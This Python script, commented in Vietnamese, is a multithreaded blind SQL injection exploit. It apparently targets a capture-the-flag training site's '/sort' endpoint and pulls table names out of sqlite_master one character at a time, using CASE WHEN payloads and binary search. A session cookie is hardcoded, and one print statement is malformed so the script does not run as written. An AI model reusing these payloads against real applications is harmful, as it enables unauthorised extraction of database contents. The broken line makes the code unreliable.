from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# Bộ ký tự thường xuất hiện trong tên bảng SQLite
CHARSET = sorted(list('1234567890qwertyuiopasdfghjklzxcvbnm_'))

def fetch_table_char(session_token, base_url, offset, i):
    """
    Hàm worker dò tìm 1 ký tự tại vị trí `i` của bảng có `offset` cụ thể bằng Binary Search.
    """
    with requests.Session() as s:
        s.cookies.set("session", session_token)
        
        low = 0
        high = len(CHARSET) - 1
        ans_idx = -1
        
        # 1. Thuật toán Binary Search (<=)
        while low <= high:
            mid = (low + high) // 2
            target_char = CHARSET[mid]
            param = f"(SELECT CASE WHEN ((SELECT SUBSTR(tbl_name,{i},1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {offset}) <= '{target_char}') THEN date ELSE title END)"
            
            try:
                r = s.get(url=base_url, params={"key": param}, timeout=10)
                first = r.text.find('0001-01-01')
                second = r.text.find('0001-03-01')
                
                if first < second:
                    ans_idx = mid
                    high = mid - 1
                else:
                    low = mid + 1
            except requests.exceptions.RequestException:
                continue
                
        # 2. Bước xác thực ký tự chính xác (=)
        if ans_idx != -1:
            candidate = CHARSET[ans_idx]
            param_eq = f"(SELECT CASE WHEN ((SELECT SUBSTR(tbl_name,{i},1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {offset}) = '{candidate}') THEN date ELSE title END)"
            try:
                r = s.get(url=base_url, params={"key": param_eq}, timeout=10)
                if r.text.find('0001-01-01') < r.text.find('0001-03-01'):
                    return i, candidate
            except requests.exceptions.RequestException:
                pass
                
        return i, ''

def fetch_table_name(session_token, base_url, offset, max_len=30, max_workers=25):
    """
    Cào toàn bộ tên của 1 bảng tại OFFSET chỉ định bằng cách chạy song song các vị trí.
    """
    # Kiểm tra nhanh xem bảng có tồn tại không bằng cách check vị trí đầu tiên (i=1)
    _, first_char = fetch_table_char(session_token, base_url, offset, 1)
    if not first_char:
        return None
        
    results = {1: first_char}
    
    # Cào song song các vị trí còn lại từ 2 đến max_len
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(fetch_table_char, session_token, base_url, offset, i): i for i in range(2, max_len + 1)}
        
        for future in as_completed(futures):
            pos, char = future.result()
            if char:
                results[pos] = char
            else:
                results[pos] = ''

    # Ghép lại thành tên bảng hoàn chỉnh
    chars = []
    for i in range(1, max_len + 1):
        c = results.get(i, '')
        if not c:
            break
        chars.append(c)
        
    return "".join(chars)

def brute_force_all_tables(session_token, max_workers=25):
    base_url = "https://web-ezzz-abe632513623.training.bksec.vn/sort"
    print(f"[*] Bắt đầu cào toàn bộ tên bảng với {max_workers} luồng (Siêu tốc)...")
    
    offset = 0
    tables = []
    
    while True:
        print(f"\n[+] Đang quét bảng tại OFFSET {offset}...")
        table_name = fetch_table_name(session_token, base_url, offset, max_len=30, max_workers=max_workers)
        
        if not table_name:
            print(f"[-] Không tìm thấy bảng nào ở offset {offset}. Đã quét xong toàn bộ!")
            break
            
        print(== f"[✨] Tìm thấy Table: {table_name}" ==)
        tables.append(table_name)
        offset += 1

    print('\n--- KẾT QUẢ TỔNG HỢP CÁC BẢNG ---')
    for idx, tbl in enumerate(tables, start=1):
        print(f"Table {idx}: {tbl}")
    return tables

if __name__ == '__main__':
    session = 'eyJ1c2VyX3Nlc3Npb24iOiIyZDBhMWViNC1mOWZmLTQ3MjctYTA4Yy02OGNkOTljZWQyN2QifQ.ato64Q.ozr9PqGwmtLYCz4OwTqHnDB1iyM'
    brute_force_all_tables(session, max_workers=25)